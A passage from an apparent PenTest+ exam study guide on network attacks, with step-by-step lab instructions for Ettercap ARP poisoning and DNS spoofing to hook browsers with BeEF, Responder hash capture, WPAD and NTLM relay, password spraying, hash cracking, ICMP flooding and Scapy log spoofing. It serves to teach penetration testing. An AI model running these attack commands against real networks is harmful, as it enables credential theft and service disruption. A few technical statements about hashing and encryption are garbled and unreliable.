NOTE The CVSS calculator is a comprehensive tool that uses qualitative factors within an equation to severity ratings, given certain environmental conditions. If there's one thing that management likes, it's numbers. Having an external body with set criteria for scoring helps a security practitioner justify their assessment of a given vulnerability's seriousness.

### CWE

CWE provides a list of common software security weaknesses and mitigations for implementing good secure coding practices and software design. CWE has over 700 common software security weaknesses that are broken up into three categories, which evaluate each problem from a different point of view:

• Research concepts Intended for academic research

• Development concepts Weaknesses encountered during software development

• Architectural concepts Weaknesses encountered during software engineering

There are other external mappings and helpful views for software security weaknesses, based on relevance (Top 10 for SANS) or specific criteria, such as "Weaknesses in Mobile Applications," which shows relationships in security weaknesses found in mobile applications. An Android or iOS developer could reference this view as lessons learned and implement best practices or to build a formal test plan for the application. Similar to a CVE, each CWE includes a basic set of identifiers for each listing:

• Weakness ID (i.e., "CWE-941")

• Description of the weakness

• Extended description of the weakness

• Relationships to other views (i.e., research, development, architectural, etc.)

• Modes of introduction (when the weakness is introduced)

• Applicable platforms (software languages, operating systems, etc.)

• Common consequences (i.e., scope, impact, and likelihood)

• Likelihood of exploit

• Potential mitigations

• Memberships (shows additional categories or views that reference this weakness)

Additional identifiers can be used for documenting a weakness and revealed when applying the specific presentation filter from the drop-down box on the Individual Dictionary Definition web page. Figure 2-39 provides an example of the available presentation filters you can apply to the content when investigating the CWE. While CWE and CVE provide insight into development weaknesses and security vulnerabilities, the CAPEC provides an understanding of how malicious actors operate and take advantage of an organization's weaknesses.

Figure 2-39 CWE presentation filter

NOTE Full Disclosure (http://seclist.org/fulldisclosure) is a public vendor-neutral forum and mailing list that publishes vulnerability analysis details, exploitation techniques, discussions, and other security-relevant information for the community. Users can register for free and receive automated updates via e-mail. Each entry includes an in-depth analysis of the vulnerability, more so than you may find when searching the CVE website.

## Chapter 3: Network Based Attacks

In this chapter, you will learn about

• How to research attack vectors and perform network attacks

• Exploiting name resolution vulnerabilities

• Stress testing for availability

• Password attacks

• Researching exploits based on vulnerabilities

• Various types of layer 2 attacks

• Understand how to use tools to conduct network packet manipulation

• Identify common protocol and file-sharing exploits

This chapter will expand on the many ways to attack and exploit network-based vulnerabilities during a pentest. For the PenTest+ exam, CompTIA has grouped various operating system services and layer 2 attacks into the network-based category. Network-based vulnerabilities can lead to compromise of the target operating system, privilege escalation, or even loss or degradation of service performance. Most network-based vulnerabilities can be identified during a vulnerability assessment, using a vulnerability scanning tool like Nessus, or by conducting vulnerability research. The Metasploit Framework (https://www.metasploit.com) or SearchSploit (https://www.exploit-db.com/searchsploit) can be used to validate public exploits for vulnerabilities identified during the vulnerability assessment. We will use these tools and more as we investigate various types of network-based attacks.

### Name Resolution Exploits

Different host- and network-based protocols and services offer name resolution capabilities. A protocol is a set of formal rules that describe the functionality of how to send and receive data, while a service is a software implementation that executes the formal rules of a protocol for a specific computing platform. Many protocols apply to name resolution, but we'll talk about Domain Name System (DNS), Link-Local Multicast Name Resolution (LLMNR), and NetBIOS, which offer hostname-to-IP resolutions, depending on where the lookup occurs. DNS works at the application layer and provides essential lookup services for devices connected to the Internet or a private network. LLMNR and NetBIOS are used by Microsoft operating systems to allow clients to help improve network communication efficiency and not send lookup requests outside of the network that can be resolved internally on the local area network (LAN). NetBIOS and LLMNR are implemented on behalf of the TCP/IP stack as part of the legacy computer name registration and resolution service called Windows Internet Name Service (WINS). The Active Directory Domain Services (AD DS) is Windows implementation of a DNS server, and the DNS client is the service that supports client hostname resolution lookups; it is installed by default in later versions of Windows. Linux implements protocols such as DNS through the use of daemons. For example, UNIX/Linux systems using BIND for DNS run a daemon called named. Named runs as a service and can be used to translate domain hostnames to IP addresses for both internal and external networks. DNS clients will send a query over port 53/udp to a DNS server in hopes of receiving an answer with a corresponding IP address or fully qualified domain name (FQDN). A DNS forward lookup will ask the DNS server to provide the IP address for a given FQDN, and a reverse lookup will ask the DNS server to do the opposite and provide the FQDN for an IP address. These types of lookups are the most basic, and Figure 3-1 shows an example of a DNS reverse lookup request for example.com captured in Wireshark. In the figure, you see a DNS "Standard query" from an internal source IP address to the external DNS server to resolve the domain name example.com. The DNS server replies with the corresponding IP address for example.com, using a "Standard query response."

Figure 3-1 DNS forward lookup request

After the DNS server answers the request, it will cache the result with a time to live (TTL) value, so it doesn't have to keep submitting the same request to its DNS root server. Once the TTL expires, the server will resubmit the request to its DNS root and cache the request once again. DNS cached requests can leave DNS clients susceptible to cache poisoning and spoofing attacks if not properly configured.

### DNS Spoofing and Cache Poisoning

The Nmap enumeration script (dns-cache-snoop.nse) can assist with conducting cache snooping against an internal DNS server. The idea behind cache snooping is to see where the targets are browsing on the Internet. This type of information disclosure can help aid in various attack scenarios to include

• Waterholing If an attacker knows the websites an organization frequents, the attacker could infect the web pages in the site with malware.

• DNS spoofing An attack method used to impersonate a victim's DNS server, forcing them to navigate to a malicious website.

• DNS cache poisoning The DNS resolver cache is overwritten on the DNS server with a malicious web address, and the user will receive the malicious site instead of the intended one.

DNS spoofing is accomplished using on-path attack (previously known as man-in-the-middle [MITM]) techniques to monitor and impersonate response messages to spoof legitimate hosts. The goal is to exploit the target with a malicious redirect or steal sensitive information from a fake web page, such as impersonating a Facebook login page. Ettercap (https://www.ettercap-project.org) is a tool that pentesters can use to conduct on-path attacks against various protocols, to include DNS. Follow along with this exercise as we impersonate a local gateway host to force a target to visit a malicious web page that executes JavaScript to hook the browser exploitation framework (BeEF). You will need a Kali host, Ettercap version 0.8.2 (other versions may work with these instructions as well), and access to a local area network with a target to test with (i.e., Windows, Linux, iOS, Android, etc.).

NOTE Ettercap is installed by default in Kali Linux. BeEF can be installed by typing sudo apt install beef-xss in Kali.

1. The first step is to modify the /etc/ettercap/etter.dns and add an entry to the file for the domain name "example.com" and have it point to your malicious host. In this case, we use our Kali host IP: 192.168.48.128.

2. Next, create the web page named index.html in the /tmp directory to load a JavaScript BeEF hook using the hook.js file. This will be the web page the user will be directed to when they try to connect to example.com. The content should look like the following:

3. Now, use the Python http server module to host the web page on port 80:

python -m SimpleHTTPServer 80

4. Then, launch BeEF from a terminal window using the command sudo beef-xss. Once the web page loads, log in using the credentials you created for BeEF.

5. Next, we need to identify other hosts on the network. We can use Nmap to identify other hosts by just using ARP packets by specifying the -sn flag to disable port scanning and using the -n flag to stop IP address resolution.

$ sudo nmap -n -sn 192.168.48.128/24

6. In our case, we identify one other host: 192.168.48.129. Now that you have a target, find the gateway address for the local network using the ip route command.

NOTE You can launch a graphical user interface (GUI) for Ettercap using the command ettercap -G. But most attackers prefer command-line tools because a GUI isn't always available. Therefore, understanding the command-line options can be important.

7. We want to establish an ARP poisoning session between our gateway (192.168.48.2) and our target (192.168.48.129). The -M flag sets up the MITM (on path) technique. In this case, we are using the remote arp technique. The -T argument puts it in text-only mode. The -q argument prevents Ettercap from printing the full packet contents, so the output will be more readable. The last part is our gateway and target. These can be given in the format: MAC address/IPv4 addresses/IPv6 addresses/Ports. Note the slashes! In our example, we're not using the MAC or ports, so there will be blanks by the slash delimiters.

$ sudo ettercap -M arp:remote -T -q /192.168.48.2// /192.168.48.129//

8. After running the ettercap command, you need to enable the DNS plugin. When Ettercap launches, it gives you the option to access a help menu to figure out how to do this. One of the options on the help menu is for plugins. By typing p, you can list the plugins. We're going to use the dns-spoof plugin.

9. Once the DNS spoofing plugin is active, when the victim navigates to the web page http://example.com/index.html, they will see your hooked page. Inside Ettercap, you will see the spoof succeed.

CAUTION ARP (Address Resolution Protocol) poisoning/spoofing is a type of attack where a malicious device sends false ARP messages to other hosts on the network in an attempt to impersonate another machine, thus linking its MAC address with another host IP on the network. If you ARP-spoof your local network to make them think you are the gateway, your device could get flooded with requests and cause other hosts to become unresponsive over the network. For these exercises, we recommend using a lab environment.

10. In BeEF, you can now see the target device under the Online Browsers tab. From this point, you can use BeEF to exploit the target.

TIP Operating systems and browsers typically cache name resolution information to improve network efficiency. If the DNS spoofing attack fails, first try clearing the browser cache from the target. If you are using a Microsoft Windows operating system as your target, try using the nbstat command to clear the cache.

### Attacking LLMNR and NetBIOS

Have you ever wondered what happens behind the scenes when you map a network drive or attempt to access a Microsoft Windows–based resource over the network? Well, if it requires authentication, it is bound to pass some credentials for convenience. If it's easy for the user, it's easy for the bad guy. NetBIOS (Network Basic Input/Output System) was developed back in the 1980s under RFCs 1001 and 1002 and helps facilitate the communication of Microsoft applications over a network. NetBIOS operates within the transport and session layers of the OSI model (layers 4 and 5), providing services such as protocol management, messaging and data transfer, and hostname resolution. NetBIOS communicates over TCP/IP (NetBT) and listens on ports 137/UDP, 138/UDP, and 139/TCP. Figure 3-2 is an illustration adapted from the Microsoft TechNet Library describing NetBT in the TCP/IP protocol suite. NetBIOS ports are typically found on LANs, as NETBIOS relies on a great deal of trust being implemented and controlled through physical security boundaries and isolation (achievable through firewalls and access control lists as well), since it is a very chatty protocol and can expose a great deal of sensitive internal information, such as network domain information.

### Figure 3-2 NetBT components in the TCP/IP protocol suite

![](RackMultipart20240405-1-nwk5q_html_79ea5c94f4ff41fd.png)

LLMNR is a protocol that mimics the functionality of DNS for IPv4 and IPv6 hostname resolution for hosts operating on small networks (LANs). RFC 4795 was published in January 2007 and addresses LLMNR protocol functionality. Microsoft introduced the protocol in later releases of the Windows operating system to include Windows Vista; Windows 7, 8, and 10; and Server 2008 and 2012. Just like DNS, LLMNR and NetBT components are subject to spoofing by poisoning name service components, by impersonating legitimate hosts listening on the network, and by responding to target service requests, such as mounting a network drive. The bigger issue is that services that implement user access controls on the network (like mapping a network drive) will require authentication. A malicious user can spoof an authoritative source by responding to LLMNR (5355/UDP) and NetBT (137/UDP) requests, informing the victim, "Hey, I know where that host is." The target will send an authentication reply to the malicious host, thus compromising the username and NTLMv2 hash. Then the malicious user can crack the hash offline to recover the plaintext password.

EXAM TIP Windows isn't the only OS that uses LLMNR and NBNS. But traffic from these protocols is not universally visible. LLMNR traffic is only visible from the same multicast group. NetBIOS traffic is only visible within the same subnet because it's broadcast. In other words, if no one else shares your logical location, your Responder will be sad and lonely.

### Using Responder to Gather Hashes

Responder is an LLMNR, NBT-NS, and MDNS poisoner that can aid pentesters with poisoning name resolution services and compromising usernames and hash values with a rogue authentication server. Responder is a Python script that was developed by Laurent Gaffié and comes preinstalled in later versions of Kali Linux and can be found in /usr/share/responder. For your convenience, a bash script (responder) is available in /usr/bin to ensure it is included in your $PATH. The configuration file that gets read when executing the command is located in /etc/responder and can be tailored to your needs for the engagement. To see a list of command options, type responder -h in a terminal window. To start Responder, you can execute the following command, as shown in Figure 3-3, where -I wlan0 specifies your network interface to listen on.

Figure 3-3 Starting Responder

NOTE To see if Responder is installed in your Kali release, open a terminal window and try locate responder or which responder to see if it is currently in your $PATH. You can download the latest release from the developer's GitHub page (https://github.com/lgandx/Responder).

You will see a list of poisoners, servers, and options that are loaded after starting Responder. For each of the servers that are listed as "on," a Python listener has started to poison client requests and answers replies over ports specific to each service. When you look up the process ID (PID) for Responder and grep for listening ports under the corresponding PID, you will see a list of TCP and UDP ports Responder is listening on, as shown in Figure 3-4.

Figure 3-4 Ports and services started by Responder

Now that Responder is listening over the network, we can try and poison LLMNR requests and compromise hashes over the network. In Figure 3-5, the Administrator user is attempting to map the $HOME share from SERVER1 over the network.

Figure 3-5 Mapping a Windows network drive

NOTE Most hosts tend to follow a certain sequence for hostname resolution. Windows hosts will first try DNS to resolve the hostname. Then they will try LLMNR, and if that is unavailable, they will try the NetBIOS Name Service (NBNS). Responder works best for intercepting invalid hostname requests across the wire, and LLMNR/NBNS is a race condition otherwise. The order of resolution your target ends up following could affect the time and complexity for successful exploitation.

Once the Administrator user clicks on the Finish button, a request is sent over the network to resolve the hostname SERVER1. If the host cannot be resolved through DNS, the request is sent as an LLMNR/NBNS query. The malicious host responds and basically says, "I know where you can map that drive" and tells the target where to go. The target sends the authentication reply with the username and SMB-NTLMv2 hash value in an effort to map the network drive. Unfortunately for the Administrator user, the drive can't be mapped; however, now we have the Administrator's SMB-NTLMv2 hash, as shown in Figure 3-6, that we can try and crack offline.

Figure 3-6 The captured NTLMv2 hash in Responder

### Using WPAD Attacks with Responder

Another popular on-path technique using Responder is the Windows Proxy Auto-Discovery Protocol (WPAD) attack. Microsoft Windows clients connect to the WPAD server to obtain and configure the automatic web proxy settings for Internet Explorer. This functionality is enabled by default on most versions of Windows. In the event the Windows host cannot resolve the WPAD server hostname through DNS, it will send LLMNR and NBNS queries over the network. Responder can be configured to start a WPAD listener, force basic HTTP authentication (no encryption), and prompt a user to enter a username and password before browsing to the website. When Responder sees a request for "wpad," it will poison the answer sent to the Windows host. The user will be prompted to enter a username and password, and when the user clicks OK, the credentials will be captured by Responder.

The Microsoft Security Bulletin MS16-077 was published on June 14, 2016, to help mitigate how Windows handles proxy discovery and WPAD automatic proxy detection. Two solutions that could help mitigate the WPAD attack are to create an entry in your DNS server to point to the organization's proxy server. The other solution would be to disable Automatically Detect Settings in Internet Explorer. If the hosts are managed through Active Directory, then a group policy could be used to disable the default setting.

### NTLM Relay Attacks

You can see how we can capture NTLM hashes for offline cracking using multiple techniques within Responder. But what if you can't crack the hash or don't want to bother with it? By poisoning the response, we can entice the target to try to connect to us. But instead of delivering the resource ourselves, we can forward that request to the host that originally requested it or to a different target host, effectively sitting in the middle of the connection. This lets us deliver much more than the requested object. We can also inject malicious payloads and issue commands using the context of the user who made the request we poisoned. Maintaining access this way can be tricky, but it's a valid option if you can poison responses and can't crack the hash.

NOTE Responder has a built-in tool called Multi-Relay that allows you to perform relay attacks against NTLM. You can read more about it on the creator's blog here: http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html and here: https://g-laurent.blogspot.com/2017/03/multirelay-20-runas-pivot-svc-and.html

### Password Attacks

From a network attack perspective, we assume you have no access to the systems, only to the network. This means you may see login interfaces to applications or operating systems and choose to attack them in order to gain access to the systems and the data they protect. Ideally, you'll enumerate target users before attempting to guess their passwords, so we'll operate on the assumption that you are targeting known users in this section. We'll talk about three ways of going about this: password spraying, brute-force and dictionary attacks, and hash cracking. Before we do, we need to be clear about what you need to consider when choosing which of these to do.

Defenders look for attacks against authentication systems based on things like the source of the request, the number of attempts (including failed versus successful attempts), and the accounts targeted. As a deterrent, they may implement account lockout policies to temporarily or permanently suspend an account based on a number of failed logins, or they may enable automated blocking for a source that makes too many attempts. As a pentester, you will need to understand these concepts so that you can prevent unnecessary disruption to your client and avoid detection when necessary.

### Brute-Force and Dictionary Attacks

Brute forcing is probably the oldest method of attack. Generally, you find a user and try every possible combination of letters and numbers to guess the password. Try a. Then try aa. Then try ab. Then try ac… and so on. The pros of this method are it's simple and, if given enough time, you're guaranteed to succeed. The cons are the time required is likely to exceed the heat death of the universe, and you're probably going to trigger automated blocking defenses and set off every possible alarm while you do it.

A modification of this is to use a dictionary of known words people like to use for passwords and guess only that list. It's not guaranteed to succeed eventually, because if the password isn't in your dictionary of guesses, you're out of luck. But it will take less time to make some educated guesses. You'll still trigger automated blocking defenses and set off alarms unless your dictionary is very good (or lucky), but you'll succeed or fail more quickly than a brute-force approach.

Many tools will let you do this, such as Metasploit, Hydra, Medusa, and Nmap. In our example, we'll show Nmap performing a dictionary attack against SSH. These examples were done in Kali Linux. Our users.txt contains one entry: bob, which we assume to have been previously enumerated.

There are, of course, combinations of this as well. You can generate dictionaries based on rules that will try "Password" as well as "password" and "Passw0rd," for example. You can even generate dictionaries that will guess combinations of words. The longer your dictionary, the longer the attack will take. The more users you target, the longer the attack will take. The more guesses you make, the more likely you are to get caught or trigger a control. This is important. If the client has an account lockout policy that locks an account after four incorrect guesses, you will create a denial of service condition for any accounts you target with four or more incorrect guesses.

### Password Spraying

Password spraying addresses this problem by targeting many users with a single well-known password, like Winter2021. The theory is that out of 1,000 users, at least one of them might be using this password. The advantage of this approach is that you're less likely to trigger account lockouts. It's also faster to go through 1,000 accounts with one (or two) passwords than to attempt to try a dictionary of 100 guesses against the same number of accounts. The disadvantages are that it relies heavily on luck and good educated guesses about how people think, and you still risk alerts based on targeting many accounts from a single source or over a small amount of time.

Here's an example attacking multiple users with a single password using Hydra using Kali Linux:

### Hash Cracking

Passwords may be sent over the wire or stored in hashed format. You may intercept one or more of these hashes while pursuing other network attacks, for example, with Responder. Unlike password spraying, you do not risk account lockouts or alert triggers by cracking a hash offline. It is much faster than interacting with a service for the full login exchange, so your time limitation is often driven more by the hardware that you have available to dedicate to cracking than by the speed of the network or the authentication system being attacked.

NOTE Windows generates hash values of the account passwords in NT or NTLM format: [\<LM hash\>:\<NT hash\>]. These hashes are stored in the Security Account Manager (SAM) database on the local computer or in the NTDS.dit database on the domain controller. An NT or NTLM hash can be used for remote authentication, which is permitted with relay or pass-the-hash (PtH) methods of attack. We will cover PtH in Chapter 9. NTLMv2 hashes are used for network authentication. These hashes are based on a user's NTLM hash and derived from a challenge/response algorithm. These hashes cannot be replayed over the network.

In the /usr/share/responder directory in Kali, there are log files where Responder keeps tabs on its activity. The Poisoners-Session.log is used to document each poisoned answer sent back to targets over the network for a specific service. The Responder-Session.log documents the responses from the targets for each protocol that was poisoned. If successful, the username, hostname, and hash values will also be documented. The nice thing about the logs is that they keep a historic record of all events, with date timestamps. This is useful when troubleshooting or correlating specific attacks with customers during or post-engagement. Another convenient feature of Responder is that it will record the compromised hash values or credentials in a text file, which is already in a format John the Ripper (JTR) can understand. Figure 3-7 shows how easy it can be to execute brute-force attacks against NTLMv2 hash values to recover the Administrator's plaintext password.

Figure 3-7 Cracking NTLMv2 hash with a wordlist in JTR

There is a clear distinction between hashing and encryption. A cryptographic hash function is a type of algorithm that takes variable-length strings (message) of input and turns them into fixed-length hash values (message digest). The primary objective is message integrity, such that the hash value cannot be returned to its original string value. This makes hashing an ideal candidate for storing passwords. The most common hashing algorithms today are Message Digest 5 (MD5) and Secure Hash Algorithm (e.g., SHA-1 and SHA-256).

NOTE Hash values are not just for security. Vendors compute hash values for software releases to provide consumers with confidence that the software they are downloading originated from a trusted source. Malware research organizations, such as Virus Total (https://www.virustotal.com), compute hash values for identifying known malware. This allows malware analysts to distinguish between similar kinds of malware, regardless of whether the name of the executable has changed.

Unlike hashing, encryption is reversible. By using a key, encryption allows plaintext data to be encrypted into ciphertext and decrypted back to plaintext. Symmetric key encryption relies on the same cryptographic key to both encrypt and decrypt the data. Common types of symmetric key encryption are listed in Table 3-1. Asymmetric key encryption uses two different keys for both encryption and decryption. The secret key is only known by the author, and the public key is shared to anyone wishing to decrypt the messages. This is mostly found in client-server models for authenticating access using digital certificates (X.509) or a public key infrastructure (PKI).

Table 3-1 Common Hashing and Encryption Algorithms

TIP This section merely provides a basic introduction to various encryption and hashing technologies. To further your understanding of cryptographic algorithms, check out the Federal Information Processing Standard (FIPS) Publication 140-2 (FIPS PUB 140-2). This publication provides an in-depth look into U.S. government standards for compliant algorithms and technologies.

The hash-identifier (https://code.google.com/archive/p/hash-identifier) Python script, also available in Kali Linux, helps fingerprint various hash types by evaluating characteristics from the known hash value. Modern-day UNIX and Linux passwords are protected using a password hashing function called crypt(), which is based on the Data Encryption Standard (DES). The default hashing function for later revisions of the Linux operating systems is sha516crypt. Each hashed value is accompanied by a randomly generated 8-byte salt value in order to lower the probability of the hash value being found in a precalculated table, such as a rainbow table. Figure 3-8 provides an example of using the crypt() function in Python to compute hashes with a predefined salt value. However, the hash is only as good as the plaintext value it is protecting—or is it? Legacy hashing algorithms, such as MD4 and even MD5, are susceptible to collision attacks, where two unique inputs can produce the same hash value. In situations where security is not of primary concern, these hashing algorithms may be good enough for day-to-day use, depending on the organization's security requirements.

Figure 3-8 Crypt hashing function

Earlier, we mentioned rainbow tables. A rainbow table computes all of the possible hash values for plaintext values, up to a certain length. Regardless of your computing power, these tables can become massive and require hefty storage capacity—some over 300GB in size. Each table is usually strategically designed for a specific hash requirement, such as MD5, SHA-1, the Windows LAN Manager (LM), and NT Lan Manager (NTLM), which is used in various Microsoft network protocols for authentication. RainbowCrack (http://project-rainbowcrack.com) is a popular open-source tool that cracks password hashes using rainbow tables. RainbowCrack utilizes a time-memory trade-off algorithm to increase memory usage based on the time consumed with conducting a task. Essentially, it provides a happy medium where software and hardware can work together, instead of against each other.

EXAM TIP The LAN Manager (LM) hash is a legacy fixed-length password hashing function, which has been deprecated and disabled since Windows Vista. It is unlikely you will see any questions regarding LM on the exam.

Brute-force password attacks are very inefficient and are typically a last resort. However, tools like JTR, Cain and Abel, and Hashcat (https://github.com/hashcat) help increase the chances of successful password exploitation. JTR can conduct both dictionary and brute-force password attacks against common hashing algorithms. If you don't have a high-performance computing system composed of graphics processing unit (GPU) clusters for Hashcat or RainbowCrack, using wordlists is a quick and dirty way to find out what you are working with in regard to overall security. Figure 3-9 shows an example of using JTR with a wordlist to crack a captured password. During a pentest, if you find the organization is using passwords vulnerable to dictionary attacks, it should tell you a little about what you are up against and the maturity level of the organization's security controls. One of the hardest things to overcome as a pentester is to not overthink the problem. In some cases, admin/password is all you need.

Figure 3-9 John the Ripper

### Stress Testing Applications and Protocols

A company may need a pentester to evaluate their capabilities to thwart denial of service (DoS) attacks or to examine how a system fails under stress. US-CERT defines a DoS attack as "an attacker attempting to prevent legitimate users from accessing information or services." DoS attacks typically occur when an adversary consumes all available resources of a target using rapid methods of attack. Table 3-2 shows the Common Attack Pattern Enumeration and Classification (CAPEC) mapping of the four members of the DoS family of attacks.

![](RackMultipart20240405-1-nwk5q_html_b60f891655d158f1.png)

### Table 3-2 DoS Attack Patterns

US-CERT states that the most common method used is flooding. CAPEC identifies flooding as attack pattern ID 125. If an attack is successful, user connectivity will be limited or could even cause the target to crash. CAPEC-125 identifies other related attack patterns that fall into the flooding category. Table 3-3 provides attack definitions for each flooding technique from the CAPEC knowledge base.

![](RackMultipart20240405-1-nwk5q_html_8bdfc1d2e8a4304.png)

### Table 3-3 DoS Flooding Techniques

DoS attacks use a single network connection, whereas with a distributed-denial-of-service (DDoS) attack, adversaries launch DoS attacks across multiple network connections, thus magnifying the level of impact of a target's availability. The primary objective for a DDoS attack is to intentionally disrupt services to an online network to prevent users from accessing the resources.

The Imperva website (https://www.imperva.com/?redirect=Incapsula) provides a more thorough look into the DoS and DDoS attack techniques. Imperva organizes DoS and DDoS attacks into three categories:

• Volume-based attacks Saturate the bandwidth and are measured in bits per second (Bps)

• Protocol attacks Consume server resources and are measured in packets per second (Pps)

• Application-layer attacks Crash a service and are measured in requests per second (Rps)

Various open-source tools are available to execute DoS attacks in all three categories. Hping (hping3) (http://www.hping.org) is a TCP/IP packet assembler/analyzer installed in Kali Linux that can be used to conduct DoS attacks against TCP, UDP, ICMP, and RAW-IP protocols. Figure 3-10 shows an example of using hping3 to flood a target using a random-source IP address with ICMP echo requests. The result of the flood attack is an increase in the ICMP reply response time (measured in milliseconds, or ms) from the target.

### Figure 3-10 An ICMP flood in hping3

The status of the ping command shows typical response times from sequence 1 to 6. Then sequence 7 to 14 shows the response time after the ICMP flood was initiated. If we were to conduct the same hping3 scan across thousands of IP addresses, using a botnet, the results could be catastrophic for the target host.

NOTE A botnet is made up of many Internet-connected computing devices that are used in conjunction to carry out coordinated tasks, such as DoS attacks.

### Network Packet Manipulation

During an engagement, a pentester may identify targets protected by a firewall or network access controls that restrict access to authorized devices on the network. An Nmap port scan may show a host as down or all of the ports as "filtered," which limits the pentester's ability to troubleshoot why the connection attempts are not working. Analyzing and inspecting packets over the network can help provide some insight as to what is actually going on with the connection attempts.

### Analyzing and Inspecting Packets

Wireshark and tcpdump are two tools already installed in Kali that can help a pentester analyze and inspect network packets. Figure 3-11 shows an Nmap scan of the top TCP 1,000 ports and only 4 ports open, with 996 filtered and 10 marked as host-prohibited.

### Figure 3-11 Nmap TCP scan of top 1,000 ports

So, what does host-prohibited mean? If we run the same port scan and capture the traffic using tcpdump and save the results to a file in pcap format, you can then load the pcap file into Wireshark for analysis.

When you find a TCP port is open and reachable over the network, you will get a [SYN, ACK] back from the target. If the port is filtered, you may see a solicited response from the target such as "Destination unreachable (Host administratively prohibited)." This response is configured in the firewall rules to inform the connecting host that it is not authorized to communicate over this port. For instance, in the iptables firewall chain policy of a Linux host, the firewall could have a REJECT statement that responds to all requests not covered in the policy with an icmp-host-prohibited message, as shown here:

These types of messages are transmitted using ICMP. If we filter the packets in Wireshark using the filter "icmp," as shown in Figure 3-12, we can view the ICMP responses received from the target.

### Figure 3-12 Analyzing ICMP host-prohibited messages in Wireshark

If we look into the fourth layer of the packet "Internet Control Message Protocol," we see the ICMP Type is "3" (Destination unreachable) and the code is "10" (Host administratively prohibited) for the SMTP port 25/tcp. The ICMP parameters (e.g., types and codes) can be found on the IANA website at https://www.iana.org; click on Protocol Assignments. Some firewalls are configured to just filter the packet and not respond at all. Analyzing and inspecting packets will help troubleshoot connection failures during a pentest engagement.

### Forge and Decode Packets

In some cases, you may find a port is filtered or restricted to only authorized hosts on the network, and you may need to spoof the source IP address of an authorized host. Scapy (https://scapy.net) is a Python program that can assist with packet manipulation by forging and decoding packets. Scapy supports many use cases; however, for this section we will focus on its ability to assist with spoofing legitimate hosts on the network. Take the use case of log injection (CAPEC-93: Log Injection-Tampering-Forging). The objective for this type of an attack is to mislead an audit or cover traces of an attack. Log injection can also expose other types of vulnerabilities, such as local file inclusion (LFI), cross-site scripting (XSS), cross-site request forgery (CSRF), or even remote code execution, when malicious log entries are not validated and processed in web-based log management systems.

NOTE This tactic is really only good for "spray and pray" exploits. For example, if you spoof your IP from outside a target's network in an effort to bypass a firewall filter, you're not going to get back the responses.

Let's take a log management server such as Nagios (https://www.nagios.org), listening on port 5544/udp for Syslog data from only authorized hosts on the network. Syslog messages sent via UDP are not validated and can easily be spoofed over the network. Some legacy operating systems and devices do not support TCP-based logging, which would make spoofing log messages from legitimate hosts more difficult, as you would need to be able to spoof the TCP sequence numbers, which are exchanged between hosts while communicating over the network. Using Scapy, we can create a Python script to spoof a legitimate host on the network, like the gateway, and send a Syslog-like message to the logging server to invalidate the integrity of a customer's auditing capability. The Python code shown in Figure 3-13 will generate a spoofed Syslog request from the gateway (srcIP) and send a message (msg) to the central logging server's (dstIP) designated port for processing Syslog messages (dstPort). The spoofed\_syslog variable defines the payload and protocol to use for transferring the message (UDP). The send() function tells Scapy to send the packet, using the information defined in the payload.

### Figure 3-13 Using Scapy to spoof Syslog traffic

TIP The Scapy documentation located at https://scapy.readthedocs.io is a good reference for learning how to use the interactive Scapy shell, how to use the built-in functions, and even how to build or extend upon your own suite of tools.

When the Python script is executed, the message will be sent to the Syslog server for processing. The Nagios Syslog listener processes the message as Syslog-formatted data, parses the contents, and stores the record in the index. Figure 3-14 shows the malicious message we crafted using Scapy in the Nagios log management interface.

Figure 3-14 Malicious log entry in Nagios

NOTE Syslog is a protocol that is used to define a standard for how operating systems, processes, and applications generate messages. RFC 5424 (https://tools.ietf.org/html/rfc5424) outlines the requirements for implementing Syslog and how the messages should be formatted.

### Layer 2 Attacks

As we have learned so far, there are many nefarious things a pentester can do to attack network protocols and authentication schemes (i.e., ARP spoofing and name resolution) that can aid in successfully exploiting specific attack scenarios. CompTIA covers a few specific layer 2 attacks in the PenTest+ exam objectives. In this section, we will cover those exam objectives in greater detail and discuss how a pentester may leverage these attacks within their customer networks during an engagement.

### Attacking the Spanning Tree Protocol

In switched networks, when two network segments are connected by more than two layer 2 switches, this creates a physical loop in the topology. Interconnecting the switches with redundant links helped improve availability in the network should one of the other links fail. However, this design has inherent side effects, as it creates transmission loops on the network. The Spanning Tree Protocol (STP) is a layer 2 protocol that runs on network devices such as bridges and switches. The primary function of STP is to prevent looping in networks that have redundant paths by placing only one switch port in forwarding mode, and all other ports connected to the same network segment are configured in blocking mode. Table 3-4 shows the three different forms of STP.

![](RackMultipart20240405-1-nwk5q_html_42921a265edc1a8b.png)

### Table 3-4 Spanning Tree Protocols

STP helps monitor the topology of the network and optimize a standard communication path for transmitting Ethernet frames, thus removing redundant links and setting up a preferred link between the switches. The preferred link, which is the link with the highest bandwidth, is used until the link fails, at which point a nonpreferred link will be used to carry the traffic. This process is made possible through the root bridge. The root bridge is a reference point for all switches in a spanning tree topology. Switches in the topology will hold a root bridge election process, where the switch with the lowest Bridge ID is elected as the root bridge. The Bridge ID is generated on each switch using a priority number and the switch's MAC address. Each switch is configured with a default bridge priority ID (most switches default to a priority ID of 32768), and the value that is configured must be a multiple of 4096. During the election process, the priority ID is compared to the other switches. If a switch on the network has the same priority number as another switch, then the MAC address is compared. The switch with the lowest Bridge ID priority or MAC address will be the designated root priority.

In a switched network, Ethernet frames have no TTL value and are broadcast to all ports on a switch, with the exception of the sending port. Layer 2 switches are designed to flood frames when they don't find the frame's destination MAC address in the MAC address table. By eliminating redundant paths, STP helps prevent broadcast storms caused by loops in the network, where a broadcast frame is bounced back and forth between switches due to redundant paths. A broadcast storm could cause entire segments of the local network to become unavailable should one of the redundant links fail. Eliminating the redundant loops can also help prevent MAC address table thrashing, which is caused by two different ports on a switch broadcasting the same source MAC address.

Most newer devices run RSTP, as it has many advantages over the legacy STP. You can use Wireshark to capture STP packets on the LAN. Wireshark will provide you with the version of the STP type (STP, RSTP, or MST) by inspecting the Bridge Protocol Data Units (BPDUs), which are the update frames that are multicast between switches over the network every so often to determine if a port is in a forwarding or blocking state (prevents looping) and to determine the root bridge during the election process. The root bridge election process must be repeated when or if there is a fault in the network. For STP, protocol version ID equals "0" and version ID "3" equals RSTP/MST. So STP is good for LANs, but how do you test it?

The biggest threat to STP is a DoS attack. STP does not use an authentication process to determine the root bridge; thus, an attacker can craft malicious BPDUs of a nonexistent switch to elect it as the new root bridge. Repeating this step over and over again will cause the LAN to be in a constant election process, saturating the network with Ethernet frames and causing a broadcast storm. Proof-of-concept code and an additional demonstration can be found at www.tomicki.net/attacking.stp.php.

### VLAN Hopping

